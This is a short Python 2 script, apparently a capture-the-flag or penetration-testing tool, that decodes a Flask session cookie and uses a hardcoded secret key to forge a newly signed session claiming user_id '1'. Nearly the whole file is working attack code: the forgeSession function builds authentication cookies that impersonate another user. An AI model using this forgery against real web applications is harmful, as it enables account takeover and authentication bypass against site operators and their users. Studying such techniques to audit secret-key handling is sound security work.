# from flask.sessions import session_json_serializer
# from itsdangerous import URLSafeTimedSerializer, BadTimeSignature
# from hashlib import sha1

# signer = URLSafeTimedSerializer(
#     'a155eb4e1743baef085ff6ecfed943f2', salt='',
#     serializer=session_json_serializer,
#     signer_kwargs={'key_derivation': 'hmac', 'digest_method': sha1}
# )

from hashlib import *
from flask.sessions import session_json_serializer
from itsdangerous import URLSafeTimedSerializer, BadTimeSignature, base64_decode
import base64
import zlib

EXAMPLE_SESSION = '.eJwlj0GKAzEMBP_i8xwkeSTb-cwgyRIbArswk5xC_h7DnvpUVPW7HHnG9VNuz_MVWznus9wKItZeswp20WQTUojcDTpDgg9x7jZmNPFOWlWIBmavmhN5qlVT8z5gEIL3BCLOMLQ2bQqyOrDUZjMG7JRjMBg2l7Wk0izLVvw683j-PeJ39cAeA5e8k7cKiZkh0wCTARGQfRVIa3VxryvO_xN7-XwBaw0-Bw.DpFgoA.eJ3kM-PYCWKf6Drb7Sh_mTIKpC8'

signer = URLSafeTimedSerializer(
    'a155eb4e1743baef085ff6ecfed943f2', salt='cookie-session',
    serializer=session_json_serializer,
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': sha1}
)

def verify_cookie(cookie):
    session_data = signer.loads(cookie)
    print "Verified, ", session_data

def forgeSession(payload):
    gen_payload = signer.dumps(payload)
    print "Generated signed cookie : {}".format(gen_payload)
    return gen_payload


def decodeCookiePayload(payload):
    if payload[0] == '.':
        session_payload = payload[1:].split('.')[0]
        decoded_session_payload = base64_decode(session_payload)
        decompressed_session_payload = zlib.decompress(decoded_session_payload)
        print "Extracted decoded uncompressed datas : {} ".format(decompressed_session_payload)
        
if __name__ == '__main__':

    # Decode
    decodeCookiePayload(EXAMPLE_SESSION)
    verify_cookie(EXAMPLE_SESSION)

    payload = {u'csrf_token': u'5032e79da8326c6a65e8e3d69f92538fbb518de5', u'_fresh': True, u'user_id': u'1', u'_id': u'78c40ae55736d98e1570d91ffd98639258d4721bcc99dd6dfe8f531ee32342a4e9e3db7483adeede089a98f855af882d65da3b9cf19b3152b0ec6f2950a6d4af'}
    gen_payload = forgeSession(payload)
    verify_cookie(gen_payload)
    # decodeCookiePayload(gen_payload)


